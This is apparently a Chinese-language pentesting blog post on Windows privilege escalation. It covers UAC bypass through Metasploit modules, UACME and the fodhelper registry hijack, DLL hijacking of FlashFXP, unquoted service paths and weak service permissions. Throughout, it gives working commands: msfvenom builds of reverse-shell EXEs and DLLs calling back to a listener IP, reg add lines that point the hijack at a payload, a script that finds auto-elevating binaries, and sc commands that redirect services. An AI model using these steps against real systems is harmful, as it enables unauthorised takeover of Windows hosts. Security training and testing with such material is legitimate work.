---
title: "UAC绕过_不同提权手法"
slug: uacrao-guo_bu-tong-ti-quan-shou-fa
cover: ""
date: 2026-01-09
halo:
  site: http://www.hzhsec.top
  name: bb7135f2-9353-4ae7-9940-a8c570ef6951
  publish: true
---

<!--more-->
# Win系统提权-本地管理用户-UAC绕过

## BypassUAC自动提权

**什么是UAC?**

UAC 就是 Windows 的“权限把控门”，普通程序过不去，只有经过用户确认才能执行高权限操作。

**MSF模块**  
为了远程执行目标的exe或者bat可执行文件，需要绕过此安全机制。  
在用户到系统权限自动提权中也可通过BypassUAC实现自动化提权。

绕过项目：MSF内置，Powershell渗透框架，UACME项目(推荐)  
开启UAC和未开启UAC时，CS/MSF默认getsystem提权影响（进程注入等）

```

./msfvenom -p windows/meterpreter/reverse_tcp lhost=172.27.28.12 lport=4444 -f exe -o msf.exe

# 生成 x64 可执行（staged meterpreter）

./msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=172.27.28.12 LPORT=3333 -f exe -o shell/evil_x64.exe

# 或者生成 stageless（有时更稳定/绕 AV）

./msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=172.27.28.12 LPORT=3333 -f exe -o shell/evil_x64_stageless.exe
```

MSF模块：

```

use exploit/windows/local/ask
use exploit/windows/local/bypassuac
use exploit/windows/local/bypassuac_sluihijack
use exploit/windows/local/bypassuac_silentcleanup
```

**UACME**  
UACME项目：[https://github.com/hfiref0x/UACME](https://github.com/hfiref0x/UACME)  
Akagi64.exe 编号 调用执行  

### 其他

**注册表白名单绕过**

1. 寻找不弹UAC框的程序  

检测脚本：

```python
import os
from subprocess import *
path = 'c:\windows\system32'
files = os.listdir(path)
print(files)
def GetFileList(path, fileList):
    newDir = path
    if os.path.isfile(path):
        if path[-4:] == '.exe':
            fileList.append(path)
    elif os.path.isdir(path):
        try:
            for s in os.listdir(path):
                newDir=os.path.join(path,s)
                GetFileList(newDir, fileList)
        except Exception as e:
            pass
    return fileList
files = GetFileList(path, [])      
print(files)
for eachFile in files:
    if eachFile[-4:] == '.exe':
        command = r'.\sigcheck64.exe -m {} | findstr auto'.format(eachFile)
        print(command)
        p1 = Popen(command, shell=True, stdin=PIPE, stdout=PIPE)
        if '<autoElevate>true</autoElevate>' in p1.stdout.read().decode('gb2312'):
            copy_command = r'copy {} .\success'.format(eachFile)
            Popen(copy_command, shell=True, stdin=PIPE, stdout=PIPE)
            print('[+] {}'.format(eachFile))
            with open('success.txt', 'at') as f:
                f.writelines('{}\n'.format(eachFile))
```

2. 先在cmd运行测试是否弹UAC

```powershell
c:\windows\system32\bthudtask.exe                       ok
c:\windows\system32\changepk.exe
c:\windows\system32\ComputerDefaults.exe                ok      1
c:\windows\system32\dccw.exe                            ok      1
c:\windows\system32\dcomcnfg.exe                        ok      1
c:\windows\system32\DeviceEject.exe                     ok  
c:\windows\system32\DeviceProperties.exe                ok
c:\windows\system32\djoin.exe                           ok
c:\windows\system32\easinvoker.exe                      ok
c:\windows\system32\EASPolicyManagerBrokerHost.exe      ok
c:\windows\system32\eudcedit.exe                        ok      1
c:\windows\system32\eventvwr.exe                        ok      1
c:\windows\system32\fodhelper.exe                       ok      1
c:\windows\system32\fsquirt.exe                         ok      1
c:\windows\system32\FXSUNATD.exe                        ok
c:\windows\system32\immersivetpmvscmgrsvr.exe           ok
c:\windows\system32\iscsicli.exe                        ok      1
c:\windows\system32\iscsicpl.exe                        ok      1
```

3. 查询注册表Shell\Open\command键值对
   通常以shell\open\command命名的键值对存储的是可执行文件路径，静默提升权限后即可运行该键值对程序。

Procmon监听找到程序注册表信息，过滤
![[6.jpg]]
会去查询 `HKCU:\Software\Classes\ms-settings\shell\open\command`，然后在注册表创建该键值对，从而绕过UAC

**注册表劫持绕过**

#### Fodhelper.exe

![[3240693-20230731221055025-1411728646.png]]
执行注册表写入：

```cmd
reg add HKEY_CURRENT_USER\Software\Classes\ms-settings\shell\open\command /d C:\Windows\System32\cmd.exe /f
reg add HKEY_CURRENT_USER\Software\Classes\ms-settings\shell\open\command /v DelegateExecute /t REG_DWORD /d 00000000 /f
```

不同位数cmd窗口可能显示不同，Fodhelper仅适用于Win10

执行-x64：

```cmd
reg add HKEY_CURRENT_USER\Software\Classes\ms-settings\shell\open\command /d C:\Users\huangzonghui\Desktop\1\msf.exe /f
reg add HKEY_CURRENT_USER\Software\Classes\ms-settings\shell\open\command /v DelegateExecute /t REG_DWORD /d 00000000 /f
```

![[屏幕截图 2025-10-23 183641.png]]
反弹成功，执行getsystem提权

---

# Win系统提权-本地普通用户-DLL劫持

## DLL劫持提权应用配合MSF-FlashFXP

原理：Windows程序启动时需要DLL。如果DLL不存在，则可以在程序查找位置放置恶意DLL提权。搜索顺序：

1、应用程序加载目录
2、C:\Windows\System32
3、C:\Windows\System
4、C:\Windows
5、当前工作目录（CWD）
6、PATH环境变量目录（系统优先于用户）

过程：信息收集 → 进程调试 → 制作dll并上传 → 替换dll → 等待应用启动

检测：

1. ChkDllHijack
2. 火绒剑
3. 项目：[https://github.com/anhkgg/anhkgg-tools](https://github.com/anhkgg/anhkgg-tools)
   ![[屏幕截图 2025-10-23 185636.png]]

利用火绒剑进行进程分析加载DLL，一般寻程序DLL利用。

生成DLL：

```
./msfvenom -p windows/meterpreter/reverse_tcp lhost=172.27.28.12 lport=4444 -f dll -o shell/libeay32.dll
or
./msfvenom -p windows/meterpreter/reverse_tcp lhost=172.27.28.12 lport=4444 -f dll -o shell/ssleay32.dll
```

上传DLL：

```
meterpreter > upload /usr/src/metasploit-framework/shell/libeay32.dll C:\\Users\\huangzonghui\\Desktop\\2\\FlashFXP
```

![[屏幕截图 2025-10-23 191425.png]]
执行成功上线
![[屏幕截图 2025-10-23 191549.png]]
程序非正常
![[屏幕截图 2025-10-23 191626.png]]

---

# Win系统提权-本地普通用户-未引号服务

## 不带引号服务路径配合MSF-MacroExpert

原理：服务路径配置由于目录空格问题，可上传恶意文件触发执行
过程：检测服务权限配置 → 制作文件并上传 → 更改服务路径 → 等待调用成功

检测命令：

```
wmic service get name,displayname,pathname,startmode |findstr /i "Auto" |findstr /i /v "C:\Windows\\" |findstr /i /v """
```

![[屏幕截图 2025-10-23 191957.png]]

上传反弹exe
![[屏幕截图 2025-10-23 193119.png]]

设置执行名后，执行：

```
sc start "Macro Expert"
```

![[Pasted image 20251023193519.png]]
反弹成功
![[屏幕截图 2025-10-23 193513.png]]

---

# Win系统提权-本地管理用户-不安全权限

## 不安全的服务权限配合MSF-NewServices

原理：即使正确引用服务路径，也可能存在其他漏洞。管理配置错误，用户可能对服务拥有过多权限，可直接修改导致重定向执行文件。

过程：检测服务权限配置 → 制作文件并上传 → 更改服务路径 → 调用成功

检测脚本：[https://docs.microsoft.com/en-us/sysinternals/downloads/accesschk](https://docs.microsoft.com/en-us/sysinternals/downloads/accesschk)

```
accesschk.exe -uwcqv "huangzonghui" * -accepteula
sc config "test" binpath= "C:\Program.exe"
sc start test
```

---

# 综合类检测项目

PEAS-ng适用于Windows、Linux/Unix*和MacOS权限提升工具
项目：[https://github.com/carlospolop/PEASS-ng](https://github.com/carlospolop/PEASS-ng)

```
winPEAS.bat > result.txt
winPEASany.exe log=result.txt
```

排查信息，获取有用权限数据
![[屏幕截图 2025-10-23 195206.png]]